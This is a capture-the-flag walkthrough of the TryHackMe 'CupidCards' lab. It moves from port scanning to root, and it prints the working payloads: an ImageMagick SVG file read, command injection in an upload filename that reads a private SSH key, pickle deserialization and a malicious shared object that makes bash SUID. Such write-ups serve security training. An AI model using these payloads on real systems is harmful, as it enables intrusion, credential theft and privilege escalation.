# **CupidCards - TryHackMe**

*Target Ip. Address: 10.49.156.227*

Let' start with rustscan for a quick lookup on open ports.

```bash
kali@kali:rustscan -a 10.49.156.227
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.49.156.227:22
Open 10.49.156.227:1337
```

So, we have 2 open ports, let's see what services are running.

```bash
kali@kali:nmap -sV -sC -p 22,1337 10.49.156.227
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 08:03 +0545
Nmap scan report for 10.49.156.227
Host is up (0.074s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:a4:c8:3c:09:b9:1e:93:1e:c3:ea:56:26:16:8f:43 (ECDSA)
|_  256 7e:a0:6a:66:47:df:7e:a4:3a:42:af:0f:5a:bd:89:3b (ED25519)
1337/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.5 Python/3.12.3
|_http-title: CupidCards - Valentine's Day Card Generator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
```

So, port 22 is ssh and port 1337 is http.

<img width="1209" height="947" alt="image" src="https://github.com/user-attachments/assets/4c8daebc-9bac-4280-9445-05acfec050e5" />

We have a upload page. Since, it is a python server, php files won't work here. Let's try a demo upload, with a proper image.

<img width="527" height="818" alt="image" src="https://github.com/user-attachments/assets/86c0194a-e98e-4452-b846-03751c1309e5" />

So, it is Imagemagick. Let's try some payloads from here, to see if it works.

Tried the reverse shell trick from here "*https://imagetragick.com/*", it failed.

Let's try file read from here "*https://www.exploit-db.com/exploits/39767*".

```bash
kali@kali:cat image.png
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="text:app.py[0]"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

The payload is to read the first page of app.py, let's run and see this.

<img width="685" height="825" alt="image" src="https://github.com/user-attachments/assets/e05f9135-17b9-4928-905e-96e582c2b8f3" />

We successfully, can read the first page of app.py. Nothing interesting here.

Reading other pages similarly, we notice that it is not checking for file names, we can abuse this to run the commands on the system.

Intercept the request using burpsuite.

```request
POST /generate HTTP/1.1
Host: 10.49.156.227:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzDip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary6df57f3ce79b076fff4738bfaf7cc4ec
Content-Length: 8225
Origin: http://10.49.156.227:1337
Connection: keep-alive
Referer: http://10.49.156.227:1337/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary6df57f3ce79b076fff4738bfaf7cc4ec
Content-Disposition: form-data; name="photo"; filename="x;id>cards/id.txt;#.png"
Content-Type: image/png

ÿØÿà..............................
```

Add payload in the file name, and send the request.

<img width="1211" height="201" alt="image" src="https://github.com/user-attachments/assets/efe09570-d7b0-439b-b241-5c938a5018f0" />

We got our command "id" executed and saved in id.txt file.

Now, we can dig into and see if anything interesting, we find.

We found a ssh-key pair in cupid's .ssh directory. We can read it out.

```request
POST /generate HTTP/1.1
Host: 10.49.156.227:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary6df57f3ce79b076fff4738bfaf7cc4ec
Content-Length: 8254
Origin: http://10.49.156.227:1337
Connection: keep-alive
Referer: http://10.49.156.227:1337/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary6df57f3ce79b076fff4738bfaf7cc4ec
Content-Disposition: form-data; name="photo"; filename="x;cat /home/cupid/.ssh/cupid.priv>cards/id.txt;#.png"
Content-Type: image/png

ÿØÿà..........................
```

<img width="837" height="275" alt="image" src="https://github.com/user-attachments/assets/d98450a8-f893-4911-a9e1-f5f22db6684a" />

Change the permissions on key, and login via ssh as user cupid.

```bash
kali@kali:chmod 600 id_rsa

kali@kali:ssh -i id_rsa cupid@10.49.156.227
The authenticity of host '10.49.156.227 (10.49.156.227)' can't be established.
ED25519 key fingerprint is: SHA256:08xYsm775EasAlLEUkSl7oW2A9HapVApDeIKbZrlMIE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.156.227' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb 18 02:58:02 UTC 2026

  System load:  0.02               Temperature:           -273.1 C
  Usage of /:   11.0% of 29.01GB   Processes:             109
  Memory usage: 7%                 Users logged in:       0
  Swap usage:   0%                 IPv4 address for ens5: 10.49.156.227


Expanded Security Maintenance for Applications is not enabled.

233 updates can be applied immediately.
113 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
6 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Feb 10 12:16:17 2026 from 192.168.179.5
cupid@tryhackme-2404:~$
```

First flag at home directory.

```bash
cupid@tryhackme-2404:~$ cat cup1d.txt
THM{r3.....37}
```

We have no sudo for this user.

```bash
cupid@tryhackme-2404:~$ id
uid=1001(cupid) gid=1001(cupid) groups=1001(cupid),1002(lovers)
```

I noticed we are in lovers group. Let's see if this group has anything that might help us.

```bash
cupid@tryhackme-2404:~$ find / -group lovers 2>/dev/null
/opt/heartbreak/matcher/PROCESSING.md
/var/spool/heartbreak/inbox
```

So, let's see what that file tell us.

```bash
cupid@tryhackme-2404:~$ cat /opt/heartbreak/matcher/PROCESSING.md
# Match Request Format
Files must be valid MessagePack (.love extension).
Fields: from, to, desire (str, min 50 chars), compat (dict), notes (any)
Drop files in the spool directory for processing.
```

So, we have to create a file with .love extensionn, and drop it in the /var/spool/heartbreak/inbox, and it will be executed.

```bash
cupid@tryhackme-2404:/opt/heartbreak/matcher$ ls -la
total 24
drwxr-xr-x 2 root      root      4096 Feb 10 16:31 .
drwxr-xr-x 4 root      root      4096 Feb 10 16:38 ..
-rw-r----- 1 aphrodite lovers     197 Feb 10 16:31 PROCESSING.md
-rw-r--r-- 1 aphrodite aphrodite   84 Feb 11 15:13 config.ini
-rwxr--r-- 1 aphrodite aphrodite  711 Feb 11 15:14 hbproto.py
-rwxr--r-- 1 aphrodite aphrodite 2883 Feb 11 15:13 match_engine.py
```

We find some other interesting files in the directory with read permissions.

```bash
cupid@tryhackme-2404:/opt/heartbreak/matcher$ cat hbproto.py 
import struct
import hashlib
Αρως = b'\x89HBP'
Ερωτα = 2
Φιλία = bytes([112, 105, 99, 107, 108, 101]).decode()
Καρδιά = bytes([108, 111, 97, 100, 115]).decode()
Амур = getattr(__import__(Φιλία), Καρδιά)

def verify_header(Любовь):
    if len(Любовь) < 6:
        return False
    return True

def decode_notes(Сердце):
    if not isinstance(Сердце, bytes):
        return str(Сердце)
    try:
        return Амур(Сердце)
    except Exception:
        return None

def encode_notes(Стрела):
    爱情 = bytes([100, 117, 109, 112, 115]).decode()
    心跳 = getattr(__import__(Φιλία), 爱情)
    return 心跳(Стрела)
```

I was kind of stuck here. I found that it has some pickle vulnerability that can lead to RCE.

I found a script to make .love extension from here "*https://github.com/djalilayed/tryhackme/blob/main/Love_at_First_Breach_2026_Advanced_Track/Cupid_Cards/aphrodite.py*".

Let's run the script to create malicious .love file.

```bash
cupid@tryhackme-2404:/tmp$ python3 exploit.py 
Pickle bytes: b'\x80\x04\x95\xcd\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c'
Type: <class 'bytes'>
Done!
notes type in data: <class 'bytes
```

Copy/Move the file to /var/spool/heartbreak/inox/ .

```bash
cupid@tryhackme-2404:/tmp$ mv exploit.love /var/spool/heartbreak/inbox/
```

Wait for some time. Now, we can use the same ssh-key we use to login as cupid to login as aphrodite.

```bash
kali@kali:ssh aphrodite@10.49.156.227 -i id_rsa
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb 18 03:20:12 UTC 2026

  System load:  0.0                Temperature:           -273.1 C
  Usage of /:   10.7% of 29.01GB   Processes:             116
  Memory usage: 13%                Users logged in:       1
  Swap usage:   0%                 IPv4 address for ens5: 10.49.156.227


Expanded Security Maintenance for Applications is not enabled.

233 updates can be applied immediately.
113 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

6 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
                              

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

aphrodite@tryhackme-2404:~$
```

Second flag at home directory.

```bash
aphrodite@tryhackme-2404:~$ cat flag2.txt 
THM{br.....ts}
```

So, again we have no sudo.

```bash
aphrodite@tryhackme-2404:~$ id
uid=1002(aphrodite) gid=1003(aphrodite) groups=1003(aphrodite),1002(lovers),1004(hearts)
```

We are in group hearts. Let's see if anything that can help us.

```bash
aphrodite@tryhackme-2404:~$ find / -group hearts 2>/dev/null
/opt/heartbreak/plugins
/opt/heartbreak/plugins/manifest.json
/usr/local/bin/heartstring
```

We have some SUID binaries, plugins and a .json file.

```bash
aphrodite@tryhackme-2404:~$ cat /opt/heartbreak/plugins/manifest.json
{
  "plugins": {
    "rosepetal": {
      "hash": "f7fb2b551f107ee61e20de29d153e1de027b44e50fd70cc50af36e08adc3b3bf",
      "description": "Rose petal animation plugin",
      "version": "1.0"
    },
    "loveletter": {
      "hash": "b47a17238fb47b6ef9d0d727453b0335f5bd4614cf415be27516d5a77e5f4643",
      "description": "Love letter formatter plugin",
      "version": "1.0"
    }
  }
}
```

```bash
aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ ls -la
total 44
drwxr-x--- 2 root hearts  4096 Feb 10 16:38 .
drwxr-xr-x 4 root root    4096 Feb 10 16:38 ..
-rwxr-xr-x 1 root root   15552 Feb 10 16:38 loveletter.so
-rw-rw-r-- 1 root hearts   390 Feb 10 16:38 manifest.json
-rwxr-xr-x 1 root root   15552 Feb 10 16:38 rosepetal.so
```

So, the .json file has the sha256 hash of the binaries loveletter.so abd rosepetal.so.

```bash
aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ /usr/local/bin/heartstring
HeartString v2.14
Usage: heartstring <command> [args]
Commands:
  encrypt <file>     Encrypt a file with HeartString cipher
  decrypt <file>     Decrypt a HeartString file
  status             Show HeartString status
  plugin <name>      Load a HeartString plugin
aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ 
```

And, this binary is used to load the plugin. Maybe we can replace hash in manifest.json, with our payload hash.

```bash
aphrodite@tryhackme-2404:/tmp$ cat exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("chmod +s /bin/bash");
}
```

We create a malicios c file to make /bin/bash SUID. Compile the c file.

```bash
aphrodite@tryhackme-2404:/tmp$ gcc -shared -fPIC -o exploit.so exploit.c
```
```bash
aphrodite@tryhackme-2404:/tmp$ sha256sumexploit.so
cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094 exploit.s
```

Since, we have write permissions in manifest.json, we can edit the hash with our hash.

```bash
aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ cat manifest.json 
{
  "plugins": {
    "rosepetal": {
      "hash": "f7fb2b551f107ee61e20de29d153e1de027b44e50fd70cc50af36e08adc3b3bf",
      "description": "Rose petal animation plugin",
      "version": "1.0"
    },
    "loveletter": {
      "hash": "b47a17238fb47b6ef9d0d727453b0335f5bd4614cf415be27516d5a77e5f4643",
      "description": "Love letter formatter plugin",
      "version": "1.0"
    },
    "exploit": {
      "hash": "cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094",
      "description": "Give me root plugin",
      "version": "1.0"
    }
  }
}
```

Let's run to see if this works.

```bash
aphrodite@tryhackme-2404:~$ /usr/local/bin/heartstring plugin exploit
Error: plugin 'exploit' not found.
```

I think we are missing some command, let's see the binary strings.

```bash
aphrodite@tryhackme-2404:/tmp$ strings /usr/local/bin/heartstring
/lib64/ld-linux-x86-64.so.2
mgUa
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
SHA256_Init
SHA256_Final
SHA256_Update
.
.
.
.
.
Commands:
/opt/heartbreak/plugins
%s/%s.so
--dev
[dev] Using local plugin: %s
"%s"
Error: cannot read manifest.
"hash"
```

We find a --dev tag, which is needed for using a local plugin.

```bash
aphrodite@tryhackme-2404:/tmp$ /usr/local/bin/heartstring plugin exploit --dev
[dev] Using local plugin: /tmp/exploit.so
Loading plugin 'exploit'...
Plugin 'exploit' loaded successfully.
```

Let's check if /bin/bash is SUID now.

```bash
aphrodite@tryhackme-2404:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Yay! The exploit worked, now we can become root.

```bash
aphrodite@tryhackme-2404:~$ /bin/bash -p
bash-5.2# id
uid=1002(aphrodite) gid=1003(aphrodite) euid=0(root) egid=0(root) groups=0(root),1002(lovers),1003(aphrodite),1004(hearts)
```

Let's read the final flag and end this challenge.

```bash
bash-5.2# cat flag3.txt
THM{h3....._u}
```
